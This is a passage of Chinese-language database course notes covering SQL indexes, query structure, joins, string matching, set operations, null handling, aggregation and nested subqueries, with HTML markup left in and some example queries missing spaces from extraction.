unique(distinct):唯一性索引，不允许表中不同的行在索引列上取相同的值.若已有相同值存在,则系统给出相关信息,不建此索引.系统并拒绝违背唯一性的插入、更新</span><br><span class="line"># cluster: 聚集索引,表中元组按索引项的值排序并物理地聚集在一起.一个基本表上只能建一个聚集索引</span><br><span class="line"># asc|desc: 索引表中索引值的排序次序,缺省为asc</span><br><span class="line"></span><br><span class="line">drop index index_name</span><br><span class="line"># 删除索引</span><br></pre></td></tr></table></figure><h5 id="索引的有关说明"><a href="#索引的有关说明" class="headerlink" title="索引的有关说明"></a>索引的有关说明</h5><ul><li><p>可以动态地定义索引，即可以随时建立和删除索引</p></li><li><p>不允许用户在数据操作中引用索引。索引如何使用完全由系统决定，这支持了数据的物理独立性</p></li><li><p>应该在使用频率高的、经常用于连接的列上建索引</p></li><li><p>一个表上可建多个索引。索引可以提高查询效率，但索引过多耗费空间，且降低了插入、删除、更新的效率</p></li></ul><h5 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">createtablestudent(</span><br><span class="line">4IDvarchar(5),</span><br><span class="line">    namevarchar(20)not null,</span><br><span class="line">    dept_namevarchar(20),</span><br><span class="line">    total_creditnumeric(3,0)default0,</span><br><span class="line">    primarykey(ID)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">createindexstudentID_indexon student(ID)</span><br></pre></td></tr></table></figure><ul><li>索引是一种数据结构，用于加快查询在索引属性上取给定值的元组的速度</li></ul><p>==&gt;详细见后面 <a href>#索引</a></p><h3 id="SQL查询的基本结构"><a href="#SQL查询的基本结构" class="headerlink" title="SQL查询的基本结构"></a>SQL查询的基本结构</h3><p><strong>SQL的数据操纵语言（DML）</strong>提供了从数据库中查询信息，以及在数据库中插入元组、删除元组、修改元组的能力</p><ul><li>SQL中的标识符大小写不敏感</li></ul><h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><p><code>select</code>子句用于列出查询结果中所需要的属性，与关系代数中的投影运算相对应</p><p>SQL允许在关系和查询结果中保留重复的元组</p><p>强制去重，需要在<code>select</code>之后使用关键字<code>distinct</code></p><p><code>*</code>一般代表所有属性，是一个通配符</p><p><code>Select</code>子句可包含<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>运算符的算数表达式,运算对象可以是常量或者元组的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 典型的查询语句</span><br><span class="line"># Ai表示一个属性,ri表示一个关系,P是一个谓词(即可以是一个条件判断)</span><br><span class="line">selectA1,A2,...,An</span><br><span class="line">fromr1,r2,...,rn</span><br><span class="line">whereP</span><br><span class="line"></span><br><span class="line"># 去重</span><br><span class="line">select distinct dept_name</span><br><span class="line">4frominstructor</span><br><span class="line">4</span><br><span class="line"># 关键词all显式指明不去重复</span><br><span class="line">select all dept_name </span><br><span class="line">4from instructor</span><br><span class="line">4</span><br><span class="line"># *代表所有属性</span><br><span class="line">select *</span><br><span class="line">4from instructor</span><br><span class="line">4</span><br><span class="line"># Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性</span><br><span class="line">selectID,name,salary/12</span><br><span class="line">4from instructor</span><br></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p><code>where</code>子句指定查询结果必须满足的条件，与关系代数中的选择谓词相对应</p><p>比较结果可以使用逻辑连词<code>and</code>，<code>or</code>，<code>not</code>连接</p><p>比较结果可以用于算术表达式</p><blockquote><p>语法成分：</p><ul><li>逻辑运算符：and，or，not</li><li>比较运算符：&lt;，&lt;=，&gt;，&gt;=，=，&lt;&gt;</li><li>between条件：判断表达式的值是否在某范围内，例如 <code>age between 18 and 20</code>==<code>age∈[18,20]</code>，<code>not between ... and ...</code></li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 找出所有在Computer Science系并且工资超过80000美元的教师的姓名</span><br><span class="line">selectname</span><br><span class="line">frominstructor</span><br><span class="line">where dept_name = &apos;Computer Science&apos; and salary &gt; 80000</span><br></pre></td></tr></table></figure><h4 id="from"><a href="#from" class="headerlink" title="from"></a>from</h4><p><code>from</code>子句列出了查询中的包含关系，与关系代数中的笛卡尔积运算相对应</p><p>笛卡尔积不是经常被直接使用，他在使用时经常与<code>where</code>子句（关系代数的选择操作）一起使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 求笛卡尔积instructor × teacher</span><br><span class="line"># 产生所有的instructor-teacher对,包含两个关系的所有属性</span><br><span class="line">select* </span><br><span class="line">frominstructor, teacher</span><br></pre></td></tr></table></figure><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 对于大学所有讲授课程的教师,找出他们的姓名以及所讲授的课程的标识</span><br><span class="line">selectname,course_id</span><br><span class="line">from instructor,teacher</span><br><span class="line">where instructor.ID = teacher.ID</span><br></pre></td></tr></table></figure><h5 id="连接查询及执行过程"><a href="#连接查询及执行过程" class="headerlink" title="连接查询及执行过程"></a>连接查询及执行过程</h5><p>同时涉及多个表的查询称为连接查询</p><p>用来连接两个表的条件称为连接条件或连接谓词</p><p>一般格式：<code>[&lt;table_name1&gt;.]&lt;col_name1&gt;&lt;比较运算符&gt;[&lt;table_name2&gt;.]&lt;col_name2&gt;</code></p><p><code>[&lt;table_name1&gt;.]&lt;col_name1&gt; between [&lt;table_name2&gt;.]&lt;col_name2&gt; AND [&lt;table_name3&gt;.]&lt;col_name3&gt;</code></p><p>连接字段：连接谓词中的列名称为连接字段。连接条件中的各连接字段类型必须是可比的，但不必是相同的</p><blockquote><ul><li><p>嵌套循环法（Nested-Loop）</p><ul><li>首先在表1中找到第一个元组，然后从头开始扫描表2，逐一查找满足连接件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。</li><li>表2全部查找完后，再找表1中第二个元组，然后再从头开始扫描表2，逐一查找满足连接条件的元组，找到后就将表1中的第二个元组与该元组拼接起来，形成结果表中一个元组</li><li>重复上述操作，直到表1中的全部元组都处理完毕</li></ul></li></ul><hr><ul><li><p>排序合并法（Sort-Merge）</p><ul><li>首先按照连接属性对表1和表2排序</li><li>对表1的第一个元组，从头开始扫描表2，顺序查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。当遇到表2中第一条大于表1连接字段值的元组时，对表2的查询不再继续</li><li>找到表1的第二条元组，然后从刚才的中断点处继续顺序扫描表2，查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。直接遇到表2中大于表1连接字段值的元组时，对表2的查询不再继续</li><li>重复上述操作，直到表1或表2中的全部元组都处理完毕为止</li></ul></li></ul><hr><ul><li><p>索引连接法（Index-Join）</p><ul><li>对表2按连接字段建立索引</li><li>对表1中的每个元组，依次根据其连接字段值查询表2的索引，从中找到满足条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组</li></ul></li></ul></blockquote><h4 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h4><p>自然连接只考虑两个关系模式中都出现的属性上取值相同的元组对，并且相同属性的列只保留一个副本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select*</span><br><span class="line">frominstructornatural jointeacher</span><br><span class="line"></span><br><span class="line">selectname,course_id</span><br><span class="line">frominstructor, teacher</span><br><span class="line">whereinstructor.iD = teacher.ID</span><br><span class="line">||</span><br><span class="line">selectname,course_id</span><br><span class="line">from instructor natural jointeacher</span><br></pre></td></tr></table></figure><p>自然连接中的危险：有些属性可能具有相同的名称，但是他们的实际意义是不同的，在这种情况下，他们可能被错误的认为是相同属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 错误的写法(使course.dept_name = instructor.dept_name)</span><br><span class="line">select name, title</span><br><span class="line">from instructor natural join teaches natural join course;</span><br><span class="line"></span><br><span class="line"># 正确的写法</span><br><span class="line">select name, title</span><br><span class="line">from instructor natural join teaches, course </span><br><span class="line">where teaches.course_id = course.course_id;</span><br><span class="line"></span><br><span class="line"># 另一个正确的写法</span><br><span class="line">select name, title</span><br><span class="line">from (instructor natural join teaches) join course using(course_id);</span><br></pre></td></tr></table></figure><h4 id="更名运算"><a href="#更名运算" class="headerlink" title="更名运算"></a>更名运算</h4><p>SQL允许使用as子句对关系和属性进行更名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">old_name as new_name</span><br></pre></td></tr></table></figure><ul><li><strong>在Oracle中，关键词<code>as</code>必须被省略</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#例</span><br><span class="line">selectID,name,salary/12 as monthly_salary</span><br><span class="line">from instructor</span><br><span class="line"></span><br><span class="line"># 找出满足工资至少比Computer Science系某一个教师的工资要高的教师姓名</span><br><span class="line">selectdistinctT.name</span><br><span class="line">from instructoras T,instructoras S</span><br><span class="line">whereT.salary &gt; S.salaryandS.dept_name = &apos;Computer Science&apos;</span><br></pre></td></tr></table></figure><h4 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h4><p>SQL中通过字符串匹配运算来支持在字符串上的比较，使用<code>like</code>操作符来实现模式匹配，使用两个特殊字符（通配符）描述模式</p><ul><li>百分号（<code>%</code>）：<code>%</code>字符匹配任何子串</li><li>下划线（<code>_</code>）：<code>_</code>字符匹配任何字符</li><li><code>Like</code>的单向性：<ul><li><code>&#39;济南市山大路&#39; like &#39;济南市%&#39; = true</code></li><li><code>&#39;济南市%&#39; like &#39;济南市山大路&#39; = false</code></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出名字中包含dar的教师名字</span><br><span class="line">selectname</span><br><span class="line">frominstructor</span><br><span class="line">wherename like &apos;%dar%&apos;</span><br><span class="line"></span><br><span class="line"># 匹配字符串“100 %”</span><br><span class="line">str like &apos;100 \%&apos; escape &apos;\&apos;</span><br></pre></td></tr></table></figure><h5 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h5><p><code>Escape</code>定义转义字符，以去掉特殊字符的特定含义，使其被作为普通字符对待，如用<code>escape &#39;\&#39;</code>，定义<code>\</code>作为转义字符，则可用<code>\%</code>去匹配<code>%</code>，用<code>\_</code>取匹配<code>_</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;ab\%cd%&apos; escape &apos;\&apos;= &apos;ab%cd&apos;</span><br><span class="line">&apos;ab\\cd%&apos; escape &apos;\&apos;= &apos;ab\cd&apos;</span><br></pre></td></tr></table></figure><p><strong>VALUE是大小写敏感的</strong></p><blockquote><ul><li>模式匹配的例子：<ul><li>‘Intro%’ 匹配任何以“Intro”打头的字符串</li><li>‘%Comp%’ 匹配任何包含“Comp” 子串的字符串</li><li>‘_ _ _’匹配只含三个字符的字符串</li><li>‘_ _ _ %’匹配至少含三个字符的字符串</li></ul></li></ul><ul><li>SQL 支持一系列的串运算，包括<ul><li>串联 （使用“||”）</li><li>大小写转换</li><li>计算串长度, 抽取子串, 等等 </li></ul></li></ul></blockquote><h4 id="排列元组的显示次序"><a href="#排列元组的显示次序" class="headerlink" title="排列元组的显示次序"></a>排列元组的显示次序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 按字母顺序排列出所有教师的名字</span><br><span class="line">selectdistinctname</span><br><span class="line">frominstructor</span><br><span class="line">order by name</span><br><span class="line"></span><br><span class="line"># 我们可以用desc指定降序,用asc指定升序,默认情况下是升序排列</span><br><span class="line">order by name desc</span><br><span class="line"></span><br><span class="line"># 可以在多个属性上进行排序</span><br><span class="line">order by dept_name,name</span><br></pre></td></tr></table></figure><p>只是显示次序排序，只能是sql的最后一个子句，只能出现目标列内的字段</p><p>当排序列含空值时，ASC排序列为空值的元组最后显示，DESC排序列为空值的元组最先显示</p><h4 id="where子句谓词"><a href="#where子句谓词" class="headerlink" title="where子句谓词"></a>where子句谓词</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 元组比较</span><br><span class="line">selectname,course_id</span><br><span class="line">frominstructor, teacher</span><br><span class="line">where(instructor.ID, dept_name) = (teacher.ID, &apos;Biology&apos;)</span><br><span class="line"></span><br><span class="line"># 表示方法: (v1,v2,...,vn)</span><br><span class="line"># 元组比较: 按照字典顺序进行比较</span><br><span class="line"># 例如 (a1,a2)&lt;=(b1,b2) === (a1&lt;b1)or ((a1=b1) and (a2&lt;=b2))</span><br></pre></td></tr></table></figure><h4 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h4><ul><li><p>对于存在重复元组的关系，SQL 可以决定在结果中显示该元组的几个副本 </p></li><li><p>一些关系代数运算的<strong>多重集</strong>版本——给定多重集关系<em>r</em>1 和<em>r</em>2 ：</p><ol><li>σ<sub>θ</sub> (r1)：如果关系<em>r</em>1的元组<em>t</em>1有c1个副本，并且<em>t</em>1满足选择条件σ<sub>θ</sub>  ，则在 σ<sub>θ</sub> 里有<em>c</em>1个<em>t</em>1的副本</li><li>Π<sub>A</sub> (r)：对于关系<em>r</em>1的每个元组<em>t</em>1的每个副本，在Π<sub>A</sub> (r1)里都有一个副本Π<sub>A</sub> (t1) ，Π<sub>A</sub> (t1)是r1中相应副本t1的投影</li><li>r1  x r2：如果关系<em>r</em>1的元组<em>t</em>1有<em>c</em>1个副本，关系<em>r</em>2的元组<em>t</em>2有<em>c</em>2个副本，则关系<em>r</em>1 x <em>r</em>2的元组t1，t2有<em>c</em>1 x <em>c</em>2个副本</li></ol></li></ul><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><p>集合运算<code>union</code>，<code>intersect</code>和<code>except</code>，每个运算都自动去重</p><p>union：并集；intersect：交集；except：差集(在Oracle中，是minus)；</p><p>如果要保留重复，则要使用对应的多重集版本<code>union all</code>，<code>intersect all</code>，<code>except all</code></p><blockquote><p>如果一个元组在r中出现m次，在s中出现n次，那么：</p><ul><li><code>r union all s</code>：m+n次</li><li><code>r intersect all s</code>：min(m,n)次</li><li><code>r except all s</code>：max(0,m-n)次</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出在2009年秋季开课，或者在2010年春季开课，或两个学期都开课的所有课程</span><br><span class="line">(select course_id </span><br><span class="line"> from section </span><br><span class="line"> where sem = ‘Fall’ and year = 2009)</span><br><span class="line">union(select course_id </span><br><span class="line">      from section </span><br><span class="line">      where sem = ‘Spring’ and year = 2010)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 找出在2009年秋季和2010年春季都开课的所有课程</span><br><span class="line">(select course_id </span><br><span class="line"> from section </span><br><span class="line"> where sem = ‘Fall’ and year = 2009)</span><br><span class="line">intersect(select course_id </span><br><span class="line">          from section </span><br><span class="line">          where sem = ‘Spring’ and year = 2010)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 找出在2009年秋季学期开课但不在2010年春季学期开课的所有课程</span><br><span class="line">(select course_id </span><br><span class="line"> from section </span><br><span class="line"> where sem = ‘Fall’ and year = 2009)</span><br><span class="line">except/minus(select course_id </span><br><span class="line">             from section </span><br><span class="line">             where sem = ‘Spring’ and year = 2010)</span><br></pre></td></tr></table></figure><h4 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h4><p>元组的一些属性可以为空值，用<code>null</code>表示</p><p>null代表一个不知道或不存在的值</p><p>包含null的任何算术表达式的计算结果是null，比如<code>5+null = null</code></p><p>谓词：<code>is null</code>可以用来检测空值，但是不能写 `var = null</p><p>带有<code>null</code>的任何比较运算返回 <code>unknown</code>，比如<code>5&lt;null := unknown</code>，<code>null&lt;&gt;null := unknown</code>，<code>null = null  := unknown</code></p><p>三值逻辑使用真值<code>unknown</code></p><ul><li>or：<code>(unknown or true) = true</code>，<code>(unknown or false) = unknown</code>，<code>(unknown or unknown) = unknown</code></li><li>and：<code>(unknown and true) = unknown</code>，<code>(unknown and false) = falses</code>，<code>(unknown and unknown) = unknown</code></li><li>not：<code>not unknown = unknown</code> </li><li>若谓词P的值为unknown，则<code>P is unknown = true</code></li></ul><p>where子句中谓词对一个元组计算出的值如果为<code>unknown</code>，则结果当false处理</p><h4 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h4><p>聚集函数以一个值的集合（集或多重集）为输入，返回单个值</p><blockquote><ul><li>avg：平均值</li><li>min：最小值</li><li>max：最大值</li><li>sum：总和</li><li>count：计数</li></ul></blockquote><p>聚集函数的性质同关系代数：①聚集函数作用域集合（多重集）返回单值；②聚集函数作用默认作用于多重集；③强制作用于集合，使用distinct。</p><p>（无分组）仅用聚集函数的SQL：SQL返回关系，返回的关系有且只有一行；Select子句中出现聚集函数，不能同时出现非聚集的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出Computer Science系教师的平均工资</span><br><span class="line">select avg(salary)</span><br><span class="line">from instructor</span><br><span class="line">where dept_name = &apos;Computer Science&apos;</span><br><span class="line"></span><br><span class="line"># 找出在2012年春季学期讲授的课程的教师总数</span><br><span class="line">select count(distinct ID)</span><br><span class="line">from teacher</span><br><span class="line">where semester = &apos;Spring&apos; and year = 2010</span><br><span class="line"></span><br><span class="line"># 找出course关系中的元组数</span><br><span class="line">select count(*)</span><br><span class="line">from course</span><br></pre></td></tr></table></figure><h5 id="group-by子句"><a href="#group-by子句" class="headerlink" title="group by子句"></a><code>group by</code>子句</h5><p>在关系子集上运用聚集函数，得到一个新的关系</p><p><code>group by</code>子句的作用对象是查询的中间结果表</p><p>分组方法：按指定一列或多列值分组，值相等为一组</p><p>使用<code>Group by</code>子句后，<code>Select</code>子句的列名列表中只能出现分组属性和聚集函数，不能出现非聚集的非分组属性</p><p>分组聚集计算时，SQL返回关系，每组对应一行，无组时返回空关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 计算每个系的教师的平均工资,dept——name为系名</span><br><span class="line">select dept_name, avg(salary)</span><br><span class="line">from instructor</span><br><span class="line">group by dept_name;</span><br></pre></td></tr></table></figure><h5 id="having子句"><a href="#having子句" class="headerlink" title="having子句"></a><code>having</code>子句</h5><p><code>having</code>是对分组聚集结果进行选择，不满足条件的舍弃</p><p><code>having</code>子句的谓词在形成分组后起作用，where子句中的谓词在分组之前起作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name,<span class="keyword">avg</span>(salary)</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> dept_name</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">avg</span>(salary)&gt;<span class="number">42000</span></span><br></pre></td></tr></table></figure><h5 id="空值和聚集"><a href="#空值和聚集" class="headerlink" title="空值和聚集"></a>空值和聚集</h5><ul><li>除了<code>count(*)</code>，所有其他的聚集运算都忽略聚集属性上为空值的元组</li><li>如果集合只有空值（输入值集合为空集），则<code>count(*)</code>运算值为0，其他所有的运算返回空值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 计算所有工资总额的查询</span><br><span class="line"># 该语句忽略了空值,若没有非空的salary,则结果为null</span><br><span class="line">selectsum(salary)</span><br><span class="line">frominstructor</span><br></pre></td></tr></table></figure><h4 id="嵌套子查询"><a href="#嵌套子查询" class="headerlink" title="嵌套子查询"></a>嵌套子查询</h4><p><strong>SQL提供了一个子查询嵌套的机制</strong></p><p>一个<strong>子查询</strong>是一个嵌套在其他的查询中的<code>select-from-where</code>表达式</p><p>子查询通常用于对集合成员的资格、集合的比较、集合的基数进行检查</p><blockquote><p>集合成员的资格：in</p><p>集合之间的比较：θ</p><p>测试集合是否为空：exists</p><p>测试集合是否存在重复元组：unique</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 找出在2009年秋季和2010年春季同时开课的所有课程</span><br><span class="line">select distinctcourse_id</span><br><span class="line">fromsection</span><br><span class="line">wheresemester = &apos;Fall&apos; and year = 2009 adn</span><br><span class="line">444course_id in (select course_id</span><br><span class="line">                         from section</span><br><span class="line">                         where semester = &apos;Spring&apos; and year = 2010);</span><br><span class="line">                         </span><br><span class="line"></span><br><span class="line"># 找出在2009年球季学期开课但不在2010年春季学期开课的所有课程</span><br><span class="line">selectdistinctcourse_id</span><br><span class="line">from section</span><br><span class="line">wheresemester = &apos;Fall&apos; and year = 2009 and</span><br><span class="line">444course_id not in (select course_id</span><br><span class="line">                             from section</span><br><span class="line">                             where semester = &apos;Spring&apos; and year = 2010);</span><br><span class="line"></span><br><span class="line"># 找出（不同的）学生总数，他们选修了ID为10101的教师所讲授的课程</span><br><span class="line">select count (distinct ID)</span><br><span class="line">from takes</span><br><span class="line">where (course_id, sec_id, semester, year) in</span><br><span class="line">44(select course_id, sec_id, semester, year</span><br><span class="line"> from teaches</span><br><span class="line">         where teaches.ID= 10101);</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"># 找出满足下面条件的所有教师的姓名，他们的工资至少比Biology系某一个教师的工资要高 </span><br><span class="line">select distinct T.name</span><br><span class="line">from instructor as T, instructor as S</span><br><span class="line">where T.salary &gt; S.salary and S.dept_name = ’Biology’;</span><br><span class="line"></span><br><span class="line"># 有些查询使用 &gt;some 子句</span><br><span class="line">select name</span><br><span class="line">from instructor</span><br><span class="line">where salary &gt; some (select salary</span><br><span class="line">                     from instructor</span><br><span class="line">                     where dept_name = ’Biology’);</span><br></pre></td></tr></table></figure><h4 id="some，any，all子句"><a href="#some，any，all子句" class="headerlink" title="some，any，all子句"></a><code>some</code>，<code>any</code>，<code>all</code>子句</h4><p><code>F &lt;comp&gt; some r</code> &hArr; ∃ t ∈ r 使得( <code>F &lt;comp&gt; t</code> )，其中<code>&lt;comp&gt;</code>可以是<code>&lt;,&lt;=,&gt;,&gt;=,&lt;&gt;</code></p><p><code>(= some)</code> ≡ <code>in</code></p><ul><li><p><strong>ALL 父查询中的结果集大于子查询中每一个结果集中的值,则为真</strong></p></li><li><p><strong>ANY,SOME 父查询中的结果集大于子查询中任意一个结果集中的值,则为真</strong></p></li></ul><blockquote><p>All：只有当其所有数据都满足条件时，条件才成立<br>Any：只要有一条数据满足条件，条件就成立<br>Some：其中存在一些数据满足条件，作用和Any大致相同 常规的使用中看作一致即可</p></blockquote><p><code>F &lt;comp&gt; all r</code> &hArr; ∀ t ∈ r（<code>F &lt;somp&gt; t</code>）</p><p><code>(≠ all)</code> ≡ <code>not in</code></p><ul><li><code>some</code>和<code>all</code>谓词可以用聚集函数实现</li></ul><table><thead><tr><th></th><th>=</th><th>&lt;&gt;或!=</th><th>&lt;</th><th>&lt;=</th><th>&gt;</th><th>>=</th></tr></thead><tbody><tr><td>some</td><td>in</td><td>–</td><td>&lt;max</td><td>&lt;=max</td><td>>min</td><td>>=min</td></tr><tr><td>all</td><td>–</td><td>not in</td><td>&lt;min</td><td>&lt;=min</td><td>>max</td><td>>=max</td></tr></tbody></table><h4 id="空关系测试"><a href="#空关系测试" class="headerlink" title="空关系测试"></a>空关系测试</h4><p><code>exists</code>结构测试子查询结果是否有元组，子查询非空的时候，返回<code>true</code></p><p><code>exists r</code> &hArr; <code>r ≠ Φ</code></p><p><code>not exists r</code> &hArr; <code>r = Φ</code></p><h5 id="exists谓词"><a href="#exists谓词" class="headerlink" title="exists谓词"></a><code>exists</code>谓词</h5><ul><li>存在量词∃</li><li>带有<code>exists</code>谓词的子查询不返回任何数据，只产生逻辑真值<code>true</code>或逻辑假值<code>false</code><ul><li>若内层查询结果非空，则返回真值</li><li>若内层查询结果为空，则返回假值</li></ul></li><li>由<code>exists</code>引出的子查询，其目标列表达式通常都用<code>*</code>，因为带<code>exists</code>的子查询只返回真值或假值，给出列名无实际意义</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 例</span><br><span class="line"># 另一种表述查询“找出在2009年秋季和2010年春季同时开课的所有课程的集合”的方式</span><br><span class="line">select course_id</span><br><span class="line">from section S</span><br><span class="line">where semester = ’Fall’ and year= 2009 and</span><br><span class="line">exists (select *</span><br><span class="line">        from section as T</span><br><span class="line">        where semester=’Spring’and year=2010</span><br><span class="line">        and S.course_id= T.course_id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2</span><br><span 